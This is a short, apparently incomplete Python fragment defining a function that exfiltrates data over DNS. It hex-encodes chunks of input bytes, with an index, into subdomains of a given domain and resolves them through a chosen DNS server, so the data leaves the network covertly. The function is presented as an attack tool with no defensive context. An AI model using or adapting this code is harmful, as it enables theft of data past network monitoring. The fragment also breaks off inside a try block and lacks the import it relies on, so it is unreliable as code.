import struct

def dns_exfiltrate(data: bytes, domain: str, dns_server: str) -> None:
    chunk_size = 16
    for i in range(0, len(data), chunk_size):
        chunk = data[i:i + chunk_size]
        subdomain = struct.pack('<I', i // chunk_size).hex() + '.' + chunk.hex() + '.' + domain
        try:
            dns.resolver.resolve(subdomain, 'A', dns_server)
